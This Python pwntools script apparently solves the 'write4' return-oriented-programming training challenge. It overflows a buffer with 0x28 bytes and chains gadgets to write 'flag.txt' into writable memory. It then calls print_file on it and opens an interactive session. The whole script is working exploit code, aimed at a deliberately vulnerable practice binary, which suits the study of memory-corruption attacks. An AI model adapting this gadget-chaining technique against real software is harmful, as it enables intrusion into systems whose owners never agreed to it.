from pwn import *

# gadget
file_name = 0x00601500          # vmmap

mov_pr14_r15 = 0x0000000000400628   # 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
pop_r14_r15 = 0x0000000000400690    # 0x0000000000400690 : pop r14 ; pop r15 ; ret
pop_rdi = 0x0000000000400693

flag_txt_str = u64("flag.txt")

def write8(where, what):
    buf = b""
    buf += p64(pop_r14_r15) # pop r14; pop r15
    buf += p64(where)
    buf += p64(what)
    buf += p64(mov_pr14_r15)
    return buf


def exploit():
    p = process("./write4")
    e = ELF('./write4')

    # proc.wait_for_debugger(p.pid)

    print_file = e.symbols['print_file']


    buf = b""
    buf += b"A"*0x28
    buf += write8(file_name, flag_txt_str)
    buf += p64(pop_rdi)
    buf += p64(file_name)
    buf += p64(print_file)

    p.sendline(buf)

    p.recvuntil(">")
    p.interactive()

exploit()